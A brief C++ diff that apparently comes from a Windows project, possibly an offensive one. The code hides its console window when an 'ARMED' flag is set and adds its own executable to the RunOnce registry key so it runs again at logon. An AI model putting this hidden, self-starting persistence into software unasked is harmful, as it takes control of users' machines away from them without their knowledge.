@@ -1,12 +1,12 @@
 #include "pch.h"
-#include "example.h"
+#include "autostart/autostart.h"
 
-int example::start() {
+int main() {
 	if constexpr (ARMED) FreeConsole();
 
 	TCHAR location[MAX_PATH];
 	GetModuleFileName(NULL, location, MAX_PATH);
-	autostart::addto_runonce(location);
+	const bool aa = autostart::addto_runonce(location);
 
 	return 0;
 }
